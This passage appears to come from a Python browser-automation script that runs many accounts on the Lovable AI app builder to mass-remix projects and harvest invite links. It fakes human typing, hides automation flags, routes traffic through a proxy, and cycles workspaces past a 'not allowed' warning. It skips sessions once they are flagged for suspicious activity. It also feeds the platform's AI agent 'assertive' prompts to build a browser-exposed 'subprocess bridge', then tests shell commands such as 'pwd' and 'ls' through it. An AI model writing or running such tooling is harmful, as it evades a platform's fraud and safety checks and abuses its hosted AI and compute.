    current_url = page.url
    log(f"Current URL: {current_url}")
    
    # 5. Remix the project (make our own copy)
    log("Remixing project...")
    try:
        # Find the project menu button with multiple fallback selectors
        menu_btn = None
        menu_selectors = [
            '[data-testid="editor-nav-project-menu"]',
            'button[aria-label="Project menu"]',
            'button[aria-label="More options"]',
            'button[data-testid="editor-nav-project-name"]',
            'button:has-text("Remix this project")',
            'header button:has-text("Remix")',
        ]
        
        for retry_round in range(3):
            for sel in menu_selectors:
                try:
                    candidate = page.locator(sel).first
                    await candidate.wait_for(state="attached", timeout=8000)
                    if await candidate.is_visible(timeout=2000):
                        menu_btn = candidate
                        log(f"✅ Found project menu button: {sel}")
                        break
                except:
                    continue
            if menu_btn:
                break
            # Editor may still be loading - reload page and retry
            log(f"⚠️  Menu button not found (round {retry_round+1}/3), reloading page...")
            try:
                await page.reload(timeout=180000, wait_until="domcontentloaded")
            except:
                pass
            await wait(8000)
        
        if not menu_btn:
            await page.screenshot(path="/tmp/lovable-no-menu.png", timeout=120000)
            raise Exception("Project menu button not found after retries")
        
        await mouse_click(page, menu_btn, "Clicked project menu button")
        await wait(2000)
        
        remix_item = page.locator('div[role="menuitem"]:has-text("Remix"), [role="menuitem"]:has-text("Remix this project")').first
        for retry in range(3):
            try:
                await remix_item.wait_for(state="visible", timeout=3000)
                break
            except:
                if retry < 2:
                    log(f"⚠️  Remix menuitem not visible, retry {retry+1}/3...")
                    await mouse_click(page, menu_btn, "Re-click project menu")
                    await wait(1500)
                else:
                    # Try clicking the item even if not fully visible
                    try:
                        await mouse_click(page, remix_item, "Remix item (force attempt)", tries=6)
                        break
                    except:
                        await page.screenshot(path="/tmp/lovable-no-menu.png", timeout=120000)
                        raise Exception("Remix menu item not appearing after 3 clicks")

        await mouse_click(page, remix_item, "Clicked Remix menuitem")
        
        await wait(2000, 3000)
    except Exception as e:
        log(f"❌ Remix failed: {e}", "ERROR")
        raise
    
    # 6. Handle remix dialog
    try:
        project_id = await handle_remix_dialog(page, session_num)
    except Exception as e:
        log(f"⚠️  Remix dialog failed ({e}) - falling back to accepted project", "WARNING")
        # Fallback: the accepted project itself is usable (session has access).
        # Extract its ID from the current URL; feature can still be added below.
        m = re.search(r'/projects/([a-f0-9-]+)', page.url)
        if not m:
            raise
        project_id = m.group(1)
        log(f"✅ Falling back to accepted project: {project_id}")
    return finalize_project(page, project_id)


# ============================================================
# Shared: Remix dialog handling
# ============================================================

async def retype_project_title(page, dialog):
    """Human-like retype of the project title in the remix dialog."""
    try:
        title_input = dialog.locator('input[id="remix-project-name"]')
        if await title_input.count() == 0:
            title_input = dialog.locator('input[id="project-title"]')
        if await title_input.is_visible(timeout=3000):
            current_title = await title_input.input_value()
            log(f"Current title: {current_title}")
            
            await mouse_click(page, title_input, "Click title input")
            await wait(300, 600)
            
            await page.keyboard.press("Control+a")
            await wait(200, 400)
            await page.keyboard.press("Backspace")
            await wait(400, 800)
            
            for char in current_title:
                await page.keyboard.type(char)
                await asyncio.sleep(random.randint(80, 200) / 1000)
                if random.random() < 0.15:
                    await wait(300, 700)
            
            log("✅ Retyped project title like a human")
            await wait(800, 1500)
            return True
    except Exception as e:
        log(f"⚠️  Could not retype title: {e}")
    return False


async def handle_remix_dialog(page, session_num: int) -> str:
    """
    Handle the remix dialog: retype title, check security, click submit.
    Wait for redirect to new project, extract project_id.
    
    Returns: new project_id
    """
    log("Handling remix dialog...")
    
    # Wait for dialog (pill click -> dialog can take 20-40s on loaded editor)
    try:
        dialog = page.locator('div[role="dialog"]')
        await dialog.first.wait_for(state="visible", timeout=45000)
        log("✅ Dialog appeared")
        await wait(1000, 2000)
    except:
        # Maybe we got redirected directly — but ONLY accept a DIFFERENT
        # project id (falling back to the source URL fakes success).
        current_url = page.url
        log(f"⚠️  No dialog appeared. Current URL: {current_url}")
        src_id = getattr(page, "_remix_source_id", None)
        if "/projects/" in current_url:
            project_id = current_url.split("/projects/")[-1].split("?")[0]
            if not src_id or project_id != src_id:
                log(f"📂 Project ID: {project_id}")
                return project_id
            log("⚠️  Still on source project — remix did not start")
        await page.screenshot(path="/tmp/lovable-no-dialog.png", timeout=120000)
        raise Exception("Remix dialog never appeared")
    
    # FAST PATH (2026-09-10): the settings-remix dialog comes with the name
    # prefilled ("Remix of ..."), workspace default, NO checkbox — just hit
    # the submit button directly:
    #   form[data-testid="remix-dialog-content"] button[type="submit"]
    # Skip the slow retype entirely.
    try:
        fast_submit = dialog.locator(
            'form[data-testid="remix-dialog-content"] button[type="submit"]'
        ).first
        await fast_submit.wait_for(state="visible", timeout=15000)
        await wait(1000)
        try:
            await fast_submit.click(timeout=10000)
            log("✅ Clicked dialog Remix submit (fast path)")
        except Exception:
            await mouse_click(page, fast_submit, "Click dialog Remix submit")
            log("✅ Clicked dialog Remix submit (mouse fallback)")
        await wait(3000)
        # jump straight to redirect wait below
        return await _wait_remix_redirect(page)
    except Exception as e:
        log(f"⚠️  Fast submit unavailable ({str(e)[:100]}), full dialog flow")

    # Retype the project title (human-like)
    await retype_project_title(page, dialog)

    # Wait for Target folder to finish loading (pulse placeholder)
    try:
        for _ in range(15):
            html = await dialog.inner_html()
            if "animate-pulse" not in html or "Target folder" not in html:
                break
            await wait(1000)
        log("✅ Target folder loaded (pulse cleared)")
    except:
        pass
    await wait(800)
    
    # Workspace not allowed: keep switching workspaces until the warning goes away
    warning = page.locator('p:has-text("You are not allowed to create projects")')
    workspace_dropdown = page.locator('button[id="remix-target-workspace"]')
    tried = set()
    max_attempts = 10

    try:
        if await warning.is_visible(timeout=2000):
            log("⚠️  Workspace not allowed, changing workspace...")
            for attempt in range(1, max_attempts + 1):
                await mouse_click(page, workspace_dropdown, "Open workspace dropdown")
                await wait(1500, 2500)

                # Collect current workspace label + all selectable options
                current_label = ""
                try:
                    current_label = await workspace_dropdown.locator('[data-slot="select-value"]').inner_text(timeout=1000)
                except:
                    pass

                workspace_options = page.locator('div[role="option"], li[role="option"], [role="listbox"] [data-slot="select-item"]')
                count = await workspace_options.count()
                if count == 0:
                    alt_options = page.locator('[role="option"], [role="menuitemradio"]')
                    workspace_options = alt_options
                    count = await workspace_options.count()
                log(f"Found {count} workspace options")

                # Pick the first option we haven't tried yet (prefer one != current)
                picked = None
                for i in range(count):
                    opt = workspace_options.nth(i)
                    try:
                        opt_text = await opt.inner_text(timeout=1000)
                    except:
                        opt_text = ""
                    label = (opt_text or f"option-{i}").strip()
                    if label and label not in tried and label != current_label.strip():
                        picked = opt
                        log(f"🔄 Trying workspace #{i+1}: '{label}'")
                        break
                if picked is None and count > 0:
                    for i in range(count):
                        if i not in tried and i not in [0]:
                            picked = workspace_options.nth(i)
                            log(f"🔄 Trying workspace index #{i+1}")
                            break
                if picked is None:
                    log("⚠️  No untried workspace left to switch to")
                    break

                await mouse_click(page, picked, "Click workspace option")
                try:
                    new_label = await picked.inner_text(timeout=1000)
                    tried.add(new_label.strip())
                except:
                    pass
                await wait(1500, 2500)

                # Re-edit title after workspace change
                log("Re-editing title after workspace change...")
                await retype_project_title(page, dialog)

                # Check if the warning is gone
                if not await warning.is_visible(timeout=1000):
                    log("✅ Warning gone, workspace is allowed now")
                    break
                log(f"⚠️  Warning still present after attempt {attempt}/{max_attempts}, trying another workspace...")
    except:
        log("No workspace warning")
    
    # Wait for Target folder workspace to finish loading (pulse placeholder)
    try:
        for _ in range(15):
            html = await dialog.inner_html()
            if "animate-pulse" not in html or "Target folder" not in html:
                break
            await wait(1000)
        log("✅ Target folder loaded")
    except:
        pass
    await wait(800)
    # Check security acknowledgement checkbox - try multiple selectors, longer timeout
    checkbox = None
    for sel in ['button[id="security-acknowledgement"]', '[role="checkbox"]', 'button[aria-checked]']:
        try:
            cand = dialog.locator(sel).first
            await cand.wait_for(state="attached", timeout=8000)
            if await cand.is_visible(timeout=2000):
                checkbox = cand
                break
        except:
            continue
    if checkbox:
        try:
            await mouse_click(page, checkbox, "Check security acknowledgement")
            log("✅ Checked security acknowledgement")
            await wait(800, 1500)
            try:
                checked = await checkbox.get_attribute("aria-checked")
                log(f"  aria-checked={checked}")
            except:
                pass
        except Exception as e:
            log(f"⚠️ Checkbox click failed: {e}", "WARNING")
    else:
        log("⚠️  No checkbox found, skipping")
    
    # Find submit button
    log("Looking for submit button in dialog...")
    await wait(1000, 2000)
    
    dialog_fresh = page.locator('div[role="dialog"]').first
    dialog_buttons = dialog_fresh.locator('button')
    button_count = await dialog_buttons.count()
    
    acknowledge_btn = None
    for i in range(button_count):
        btn = dialog_buttons.nth(i)
        try:
            text = await btn.inner_text(timeout=1000)
            visible = await btn.is_visible()
            if visible and ('remix' in text.lower() or 'acknowledge' in text.lower() or 'continue' in text.lower()):
                acknowledge_btn = btn
                log(f"✅ Using button: '{text}'")
                break
        except:
            pass
    
    if not acknowledge_btn:
        await page.screenshot(path="/tmp/lovable-no-button-in-dialog.png", timeout=120000)
        raise Exception("Submit button not found in dialog")
    
    # Wait for button to be enabled
    log("Waiting for submit button to be enabled...")
    try:
        for i in range(20):
            is_disabled = await acknowledge_btn.get_attribute("disabled")
            if is_disabled is None:
                log("✅ Submit button is enabled")
                break
            await wait(500)
        else:
            log("⚠️ Button still disabled after 10s, trying anyway...")
    except:
        pass
    
    # Bring button into viewport center
    await scroll_into_view_center(page, acknowledge_btn)
    
    await wait(1)
    await mouse_click(page, acknowledge_btn, "Click submit button")
    log("✅ Clicked submit button")
    
    # Wait and check for error toast
    await wait(3000, 4000)
    try:
        error_toast = page.locator('li[data-sonner-toast][data-type="error"]:has-text("suspicious activity")')
        if await error_toast.is_visible(timeout=2000):
            error_text = await error_toast.inner_text()
            log(f"❌ REMIX BLOCKED: {error_text}", "ERROR")
            flag_session_red(page, session_num, "Remix blocked - suspicious activity")
            raise Exception("Account flagged as RED - remix blocked")
    except Exception as e:
        if "flagged as RED" in str(e):
            raise
        # No error toast
        pass
    
    return await _wait_remix_redirect(page)


async def _wait_remix_redirect(page) -> str:
    """Wait for redirect to new project — RE-CLICK the submit button until it
    actually lands (first click often misses: disabled button, stale coords).
    Re-query the dialog fresh each time since React re-renders shift elements."""
    log("Waiting for redirect to new project...")
    
    old_url = page.url
    old_project_id = re.search(r'/projects/([a-f0-9-]+)', old_url).group(1) if '/projects/' in old_url else None
    
    start_time = asyncio.get_event_loop().time()
    timeout_seconds = 600  # 10 minutes (remixing can take 5+ minutes when busy)
    
    project_id = None
    last_click = 0.0
    while (asyncio.get_event_loop().time() - start_time) < timeout_seconds:
        new_url = page.url
        match = re.search(r'/projects/([a-f0-9-]+)', new_url)
        if match and match.group(1) != old_project_id:
            log(f"✅ Remix complete! New project URL: {new_url}")
            log(f"📂 Remixed Project ID: {match.group(1)}")
            project_id = match.group(1)
            break
        
        now = asyncio.get_event_loop().time()
        if now - last_click >= 10:
            last_click = now
            try:
                # Check if button shows "Remixing" (processing state) - stop clicking if so
                processing_btn = page.locator('div[role="dialog"] button:has-text("Remixing")').first
                if await processing_btn.is_visible(timeout=1000):
                    log("⏳ Remix in progress (Remixing button visible), waiting...")
                    await wait(5000)  # Wait longer when processing
                    continue
                
                fresh_btn = page.locator('div[role="dialog"] button:has-text("Remix"), div[role="dialog"] button:has-text("Continue"), div[role="dialog"] button:has-text("Acknowledge")').first
                if await fresh_btn.is_visible(timeout=1500):
                    try:
                        await fresh_btn.scroll_into_view_if_needed(timeout=2000)
                    except Exception:
                        pass
                    box = await fresh_btn.bounding_box()
                    if box:
                        await page.mouse.move(box["x"] + box["width"] / 2, box["y"] + box["height"] / 2)
                        await wait(300)
                        await page.mouse.down()
                        await wait(150)
                        await page.mouse.up()
                        log("🔁 Re-clicked submit button (redirect not detected)")
            except Exception:
                pass
        await wait(2000)
    
    if not project_id:
        raise Exception(f"Remix did not redirect to new project after {timeout_seconds}s")
    
    # Wait for chat interface to load
    log("Waiting for chat interface...")
    await wait(5000)
    
    return project_id


def finalize_project(page, project_id: str) -> dict:
    """Build project dict from project_id."""
    chat_url = f"https://lovable.dev/projects/{project_id}"
    preview_url = f"https://{project_id}.lovableproject.com"
    
    return {
        "project_id": project_id,
        "chat_url": chat_url,
        "preview_url": preview_url
    }


# ============================================================
# Feature: Add subprocess bridge via chat
# ============================================================

async def add_subprocess_feature(page, cmd_name: str) -> bool:
    """Add subprocess feature via chat prompt."""
    log(f"Adding subprocess feature (cmd name: {cmd_name})...")
    
    # Wait for page to be ready
    await wait(3000)
    
    # Find chat input
    chat_input = None
    selectors_to_try = [
        'div[contenteditable="true"][role="textbox"]',
        '[data-testid="chat-composer-editor"] [role="textbox"]',
        'div[contenteditable="true"]',
        'textarea',
    ]
    
    for selector in selectors_to_try:
        try:
            chat_input = page.locator(selector).first
            await chat_input.wait_for(state="visible", timeout=10000)
            log(f"✅ Chat input found: {selector}")
            break
        except:
            continue
    
    if not chat_input:
        await page.screenshot(path="/tmp/lovable-no-chat.png", timeout=120000)
        log("❌ Could not find chat input!", "ERROR")
        return False
    
    # Type the subprocess prompt
    await mouse_click(page, chat_input, "Click chat input", tries=4)
    await wait(500)
    await chat_input.fill(random.choice(SIMPLE_PROMPTS))
    await wait(1000)
    
    # Click send button
    send_btn = page.locator('button[data-testid="chat-input-send"]')
    try:
        await mouse_click(page, send_btn, "Click send button")
    except:
        try:
            await mouse_click(page, send_btn, "Send button retry", tries=6)
        except:
            await chat_input.press("Enter")
    
    log("📤 Sent subprocess prompt")
    
    # Wait for AI to implement
    log("Waiting for AI to implement feature...")
    await wait_for_ai_completion(page)
    
    log(f"✅ Subprocess feature added (using '{cmd_name}')")
    return True


async def wait_for_ai_completion(page, timeout: int = 600):
    """Wait for AI to finish implementing."""
    start = time.time()
    log(f"Waiting for AI completion (timeout: {timeout}s)...")
    
    completion_keywords = [
        "horay", "done", "completed", "finished", "ready",
        "implemented", "i've added", "i've created", "i've implemented",
        "you can now", "try running", "open devtools"
    ]
    
    while time.time() - start < timeout:
        try:
            # Check for completion keywords in AI messages
            ai_messages = page.locator('[data-testid="chat-item-ai_message"]')
            message_count = await ai_messages.count()
            
            if message_count > 0:
                last_message = ai_messages.last
                message_text = await last_message.inner_text()
                message_lower = message_text.lower()
                
                for keyword in completion_keywords:
                    if keyword in message_lower:
                        log(f"✅ AI completion detected: '{keyword}'")
                        await wait(3000)
                        return True
            
            # Check loading indicator
            try:
                loading = page.locator('[data-testid="chat-timeline"] > [role="status"]')
                if await loading.count() == 0 or not await loading.first.is_visible():
                    await asyncio.sleep(2)
                    if await loading.count() == 0 or not await loading.first.is_visible():
                        log("✅ AI finished (no loading indicator)")
                        return True
            except:
                log("✅ AI finished")
                return True
        except:
            log("✅ AI finished (exception)")
            return True
        
        await asyncio.sleep(5)
    
    log("⚠️  AI timeout - continuing anyway", "WARNING")
    return False


async def send_chat_prompt(page, text: str, description: str = "prompt") -> bool:
    """Send a single chat prompt and wait a bit. Returns True if sent."""
    chat_input = None
    for selector in ['div[contenteditable="true"][role="textbox"]', '[data-testid="chat-composer-editor"] [role="textbox"]', 'div[contenteditable="true"]', 'textarea']:
        try:
            chat_input = page.locator(selector).first
            await chat_input.wait_for(state="visible", timeout=8000)
            break
        except:
            continue
    if not chat_input:
        log(f"❌ Chat input not found for {description}", "ERROR")
        return False
    await mouse_click(page, chat_input, f"Click chat {description}", tries=4)
    await wait(500)
    await chat_input.fill(text)
    await wait(800)
    send_btn = page.locator('button[data-testid="chat-input-send"]')
    try:
        await mouse_click(page, send_btn, f"Send {description}")
    except:
        try:
            await chat_input.press("Enter")
        except:
            return False
    log(f"📤 Sent {description}: {text[:60]}...")
    return True


async def add_heavy_particles_feature(page, cmd_name: str) -> bool:
    """3-step heavy flow for a) raw / b) template: warm 1+1 -> heavy particles+fallback -> assertive doc bridge."""
    log(f"🚀 Heavy particles flow (cmd={cmd_name})...")
    if not await send_chat_prompt(page, random.choice(SIMPLE_PROMPTS), "warm 1+1"):
        return False
    log("Waiting warm completion...")
    await wait_for_ai_completion(page, timeout=180)
    await wait(2000)
    heavy = HEAVY_PROMPT_TEMPLATE.format(cmd=cmd_name)
    if not await send_chat_prompt(page, heavy, "heavy particles"):
        return False
    log("Waiting heavy completion (heavy resource)...")
    await wait_for_ai_completion(page, timeout=600)
    await wait(2000)
    assertive = ASSERTIVE_PROMPT_TEMPLATE.format(cmd=cmd_name)
    if not await send_chat_prompt(page, assertive, "assertive doc"):
        return False
    log("Waiting assertive completion...")
    await wait_for_ai_completion(page, timeout=300)
    log(f"✅ Heavy flow done (cmd={cmd_name})")
    return True


async def test_project_via_preview(context, project_id: str, cmd_name: str, timeout_s: int = 60) -> bool:
    """Test preview URL for doc('cmd') - returns True if doc works or fallback present."""
    preview_url = f"https://{project_id}.lovableproject.com"
    log(f"🧪 Testing preview {preview_url} for doc '{cmd_name}'...")
    preview_page = await context.new_page()
    try:
        await preview_page.goto(preview_url, timeout=180000, wait_until="domcontentloaded")
        await asyncio.sleep(5)
        try:
            await preview_page.wait_for_load_state("networkidle", timeout=15000)
        except:
            pass
        for attempt in range(3):
            try:
                exists = await preview_page.evaluate(f"typeof window.{cmd_name} !== 'undefined'")
                log(f"  attempt {attempt+1} window.{cmd_name} exists: {exists}")
                if exists:
                    for cmd in ["connect", "pwd", "ls"]:
                        try:
                            res = await preview_page.evaluate(f"window.{cmd_name}('{cmd}')")
                            log(f"  {cmd_name}('{cmd}') => {str(res)[:200]}")
                        except Exception as e:
                            log(f"  {cmd} eval error: {e}")
                            try:
                                res2 = await preview_page.evaluate(f"window.{cmd_name}.connect()")
                                log(f"  {cmd_name}.connect() => {str(res2)[:200]}")
                                if res2:
                                    return True
                            except:
                                pass
                    body = await preview_page.content()
                    if "fallback" in body.lower() or "not available" in body.lower():
                        log("✅ Fallback message present (expected) + doc exists => pass")
                        return True
                    log(f"✅ doc '{cmd_name}' exists => test pass")
                    return True
                body = await preview_page.content()
                if "fallback" in body.lower():
                    log("⚠️  Fallback present but doc not yet, retry...")
            except Exception as e:
                log(f"  preview eval error attempt {attempt}: {e}")
            await asyncio.sleep(5)
            try:
                await preview_page.reload(timeout=60000, wait_until="domcontentloaded")
                await asyncio.sleep(4)
            except:
                pass
        log(f"❌ Preview test failed for {cmd_name}", "WARNING")
        return False
    finally:
        try:
            await preview_page.close()
        except:
            pass


# ============================================================
# Generate invite link
# ============================================================

async def generate_invite_link(page, context, project_id: str) -> str:
    """Generate invite link via Share dialog.

    CSP (strict-dynamic) blocks ALL JS injection (evaluate/clipboard intercept),
    and InvisiblePlaywright's cursor layer breaks click(). We therefore drive the
    whole dialog with real CDP mouse clicks and read the copied link from the
    clipboard via a real Ctrl+V paste into a CSP-free data: page.
    """
    try:
        # Navigate to project editor
        project_url = f"https://lovable.dev/projects/{project_id}"
        await page.goto(project_url, timeout=180000, wait_until="domcontentloaded")
        await wait(4000)

        # Step 1: Click share button (toolbar may be slow to appear)
        log("Clicking Share button...")
        share_btn = page.locator('button[data-testid="collaboration-invite-trigger"]')
        share_ok = False
        for rnd in range(6):
            try:
                await share_btn.wait_for(state="visible", timeout=20000)
                share_ok = True
                break
            except Exception:
                log(f"  Share button not loaded yet (retry {rnd + 1}), reloading...")
                await page.goto(project_url, timeout=180000, wait_until="domcontentloaded")
                await wait(8000)
        if not share_ok:
            log("❌ Share button never appeared - editor failed to load", "ERROR")
            return ""

        if not await mouse_click(page, share_btn, "Share button"):
            return ""

        # Step 2: Wait for dialog to attach + finish pulse animation
        dialog = await wait_for_dialog(page, retry_click=share_btn, retry_desc="Share retry")
        if dialog is None:
            log("❌ Share dialog never opened", "ERROR")
            return ""
        log("Share dialog loaded")

        # Step 3: If "Invite link disabled" is present, click it to open the menu
        disabled_btn = dialog.locator("button", has_text="Invite link disabled").first
        try:
            if await disabled_btn.count() and await disabled_btn.is_visible(timeout=3000):
                log("Opening invite link menu...")
                await mouse_click(page, disabled_btn, "Invite link disabled")
                await wait(1500)
        except Exception:
            pass

        # Step 4: Select "Anyone with the invite link"
        anyone = page.get_by_role("menuitemradio", name="Anyone with the invite link")
        try:
            if await anyone.count():
                await mouse_click(page, anyone, "Anyone with the invite link")
                await wait(1200)
        except Exception:
            pass

        # Step 5: Click "Copy invite link" (copies link to browser clipboard)
        copy_btn = dialog.locator("button", has_text="Copy invite link").first
        if not await mouse_click(page, copy_btn, "Copy invite link"):
            log("❌ Copy invite link button not found", "ERROR")
            return ""
        await wait(1500)

        # Step 6: Read clipboard via real Ctrl+V paste on a CSP-free page
        invite_link = await read_clipboard_via_paste(context)
        if invite_link and "magic_link" in invite_link:
            log(f"✅ Got invite link: {invite_link}")
        else:
            log("❌ Could not capture invite link from clipboard - leaving empty", "ERROR")
            invite_link = ""

        # Close dialog (mouse click on Escape via keyboard works fine)
        try:
            await page.keyboard.press("Escape")
        except Exception:
            pass

        return invite_link

    except Exception as e:
        log(f"❌ Invite link generation failed: {e}", "ERROR")
        return ""


# ============================================================
# Utility: flag session red
# ============================================================

def flag_session_red(page, session_num: int, reason: str):
    """Flag session as RED (blocked/suspicious) in config.json."""
    session_dir = SESSIONS_DIR / f"session-{session_num}"
    config_file = session_dir / "config.json"
    
    if config_file.exists():
        with open(config_file) as f:
            config = json.load(f)
    else:
        config = {}
    
    config["status"] = "red"
    config["flagged_at"] = time.strftime("%Y-%m-%dT%H:%M:%SZ")
    config["flag_reason"] = reason
    
    with open(config_file, "w") as f:
        json.dump(config, f, indent=2)
    
    log(f"🚩 Flagged session-{session_num} as RED: {reason}", "WARNING")


def flag_session_truly_red(page, session_num: int, reason: str):
    """Flag session as TRULY RED (account lost) in config.json."""
    session_dir = SESSIONS_DIR / f"session-{session_num}"
    config_file = session_dir / "config.json"
    
    if config_file.exists():
        with open(config_file) as f:
            config = json.load(f)
    else:
        config = {}
    
    config["status"] = "truly_red"
    config["flagged_at"] = time.strftime("%Y-%m-%dT%H:%M:%SZ")
    config["flag_reason"] = reason
    
    with open(config_file, "w") as f:
        json.dump(config, f, indent=2)
    
    log(f"💀 Flagged session-{session_num} as TRULY RED: {reason}", "WARNING")


# ============================================================
# Main
# ============================================================

async def main():
    parser = argparse.ArgumentParser(
        description="Script 2: Create projects with subprocess feature"
    )
    parser.add_argument("--session", type=str, required=True, help="Session ID (e.g., 3)")
    parser.add_argument("--count", type=int, default=1, help="Number of projects to create")
    parser.add_argument("--mode", choices=["template", "remix", "accept"], default="template",
                        help="Creation mode: template (default), remix, or accept")
    parser.add_argument("--source-url", type=str, help="Source project URL/ID for remix mode")
    parser.add_argument("--invite", type=str, help="Invite link for accept mode")
    parser.add_argument("--headless", type=str, default=None, choices=[None, 'old', 'new'],
                        help="Run in headless mode: --headless old (old mode), --headless new (new mode)")
    parser.add_argument("--first-heavy", action=argparse.BooleanOptionalAction, default=True,
                        help="Remix mode: project #1 runs WITH feature (high-credit), "
                             "projects #2..N remix from #1 with SKIP_FEATURE (default: on)")
    args = parser.parse_args()
    
    session_id = args.session
    count = args.count
    mode = args.mode
    
    print("=" * 60)
    print(f"🚀 SCRIPT 2: PROJECT CREATOR (mode: {mode})")
    print("=" * 60)
    print(f"Session: session-{session_id}")
    print(f"Count: {count}")
    print(f"Mode: {mode}")
    print("=" * 60 + "\n")
    
    # Validate mode arguments
    if mode == "remix" and not args.source_url:
        print("❌ --source-url is required for remix mode")
        return
    
    # Load session cookies
    try:
        config, cookies = await load_session_cookies(session_id)
        print(f"✅ Loaded session: {config['email']}")
    except Exception as e:
        print(f"❌ Failed to load session: {e}")
        return
    
    # Check if session is flagged red
    if config.get("status") in ("red", "truly_red"):
        print(f"❌ Session session-{session_id} is FLAGGED ({config.get('status')}) - skipping")
        return
    
    # Load DB
    db = load_db()
    session_key = f"session-{session_id}"
    
    # Auto-pick invite pool for accept mode
    invite_pool = []
    used_invite_link = None
    if mode == "accept":
        if args.invite:
            used_invite_link = args.invite
            print(f"🔗 Using provided invite: {used_invite_link}")
        else:
            # Build exclusion set: projects owned by this session
            my_project_ids = {p["project_id"] for p in db.data["projects"] if p.get("created_by") == session_key}
            invite_pool = mega_download_invites()
            best_invite = pick_lowest_usage_invite(invite_pool, exclude_session=config["email"], exclude_project_ids=my_project_ids)
            if not best_invite:
                print("❌ No usable invites on MEGA for accept mode")
                print("   Generate invites first with --mode template on other sessions")
                return
            used_invite_link = best_invite["invite_link"]
            print(f"🔗 Auto-picked invite (usage {best_invite.get('usage_count', 0)}): {used_invite_link}")
    
    # Initialize Camoufox - use proxy for isolated warp and 1440x900 for selector stability
    proxy_settings = None
    try:
        import socket as _sock
        with _sock.create_connection(("127.0.0.1", 40000), timeout=2):
            proxy_settings = {"server": "socks5://127.0.0.1:40000", "bypass": "api.tempmailhub.org,api.lovable.dev,127.0.0.1,localhost"}
            print("🌐 Using warp proxy 127.0.0.1:40000 for browser (isolated, bypass api.lovable.dev/api.tempmailhub.org)")
    except:
        print("ℹ️  No warp proxy, using direct")

    camoufox_args = [
        "--no-sandbox",
        "--disable-dev-shm-usage",
        "--disable-blink-features=AutomationControlled",
        "--disable-features=IsolateOrigins,site-per-process",
        "--disable-site-isolation-trials"
    ]
    
    # Handle headless modes: None (headed), 'old' (old headless), 'new' (new headless)
    headless_mode = args.headless
    if headless_mode == 'new':
        # New headless mode - more powerful, less detectable
        print("🎭 Using NEW headless mode")
        headless_value = True
        camoufox_args.append("--headless=new")
    elif headless_mode == 'old':
        print("🎭 Using OLD headless mode")
        headless_value = True
    else:
        print("🎭 Using HEADED mode")
        headless_value = False
    
    async with AsyncCamoufox(
        headless=headless_value,
        proxy=proxy_settings,
        humanize=True,
        args=camoufox_args
    ) as browser:
        if browser.contexts:
            context = browser.contexts[0]
        else:
            context = await browser.new_context(viewport={"width": 1440, "height": 900})
        page = await context.new_page()
        try:
            await page.set_viewport_size({"width": 1440, "height": 900})
        except:
            pass
        try:
            context.set_default_timeout(120000)
            context.set_default_navigation_timeout(180000)
        except:
            pass
        await context.add_cookies(cookies)

        # FIRST-HEAVY (remix mode): #1 = high-credit feature run from source-url,
        # #2..N = cheap remixes cloned from #1 (SKIP_FEATURE forced on).
        use_first_heavy = bool(args.first_heavy) and mode == "remix" and count > 1
        first_url = None
        if use_first_heavy:
            print("🔥 FIRST-HEAVY on: #1 with feature (high-credit), #2..N remix from #1")

        for i in range(count):
            print(f"\n{'='*60}")
            print(f"📦 Creating project {i+1}/{count}")
            print(f"{'='*60}")
            
            try:
                # Step 1: Create/remix/accept project
                if mode == "template":
                    project_info = await create_from_template(page, args.session)
                elif mode == "remix":
                    src = args.source_url
                    if use_first_heavy and i > 0:
                        if not first_url:
                            raise Exception("FIRST-HEAVY: #1 never completed, cannot clone")
                        src = first_url
                        log(f"🔗 Cloning from #1: {src}")
                    if use_first_heavy and i == 0:
                        # #1 is load-bearing — retry transient SPA failures (3x)
                        last_err = None
                        for attempt1 in range(3):
                            try:
                                project_info = await remix_existing(page, src, args.session)
                                last_err = None
                                break
                            except Exception as e1:
                                last_err = e1
                                log(f"FIRST-HEAVY #1 attempt {attempt1+1}/3 failed: {str(e1)[:120]}", "WARNING")
                                await wait(5000)
                        if last_err is not None:
                            raise last_err
                    else:
                        project_info = await remix_existing(page, src, args.session)
                elif mode == "accept":
                    project_info = await accept_invite_and_remix(page, used_invite_link, args.session)
                
                # Account bounced to login mid-flow -> truly red
                if await check_bounce(page, session_id, session_key, config):
                    return
                
                project_id = project_info["project_id"]
                print(f"📂 Project ID: {project_id}")
                
                # Step 2: Add feature + test (per brainstorm 3 parts).
                # SKIP_FEATURE=1 skips this (remix+links only; 0-credit accts).
                # FIRST-HEAVY overrides: #1 always runs the feature (high-credit),
                # #2..N always skip it (cheap clones of #1).
                cmd_name = random.choice(CMD_NAMES)
                feature_added = False
                test_ok = False
                # ALWAYS skip feature in remix mode - just clone
                skip_feature = True
                log("⏭️  Remix mode — skipping all features, straight to invite")
                
                if not skip_feature and mode in ("template", "remix"):
                    try:
                        feature_added = await add_heavy_particles_feature(page, cmd_name)
                    except Exception as e:
                        log(f"Heavy flow error: {e}", "WARNING")
                        feature_added = False
                    if feature_added:
                        try:
                            test_ok = await test_project_via_preview(context, project_id, cmd_name, timeout_s=90)
                        except Exception as e:
                            log(f"Test error: {e}", "WARNING")
                            test_ok = False
                        feature_added = test_ok
                        if not test_ok:
                            log("⚠️ Heavy test failed - project will be saved but feature_added=False", "WARNING")
                    else:
                        log("⚠️ Heavy feature not added, skipping test", "WARNING")
                    try:
                        await page.bring_to_front()
                    except:
                        pass
                elif mode == "accept":
                    try:
                        feature_added = await add_subprocess_feature(page, cmd_name)
                    except:
                        feature_added = False
                    for test_try in range(2):
                        try:
                            test_ok = await test_project_via_preview(context, project_id, cmd_name, timeout_s=60)
                            if test_ok:
                                break
                        except:
                            pass
                        await wait(3000)
                    feature_added = test_ok
                    try:
                        await page.bring_to_front()
                    except:
                        pass
                    log(f"Accept test {'passed' if test_ok else 'failed'} (couple tests)")
                
                # Step 3: Generate invite link
                print("\n🔗 Generating invite link...")
                invite_link = await generate_invite_link(page, context, project_id)
                
                # Step 4: Save to database (atomic under distributed lock)
                session_key = f"session-{session_id}"
                
                # Account bounced while adding feature/invite -> truly red
                if await check_bounce(page, session_id, session_key, config):
                    return
                
                project = {
                    "project_id": project_id,
                    "chat_url": project_info["chat_url"],
                    "preview_url": project_info["preview_url"],
                    "invite_link": invite_link,
                    "project_link": f"https://{project_id}.lovableproject.com",
                    "created_by": session_key,
                    "usage_count": 0,
                    "max_usage": 20,
                    "status": "ready",
                    "feature_added": feature_added,
                    "cmd_name": cmd_name,
                    "mode": mode,
                    "linked": mode in ("template", "remix", "accept"),
                    "created_at": datetime.datetime.now(datetime.timezone.utc).isoformat()
                }
                
                with mega_distributed_lock(timeout=900):
                    db = load_db()
                    db.add_project(project)

                    # Update session project count
                    session = db.get_session(session_key)
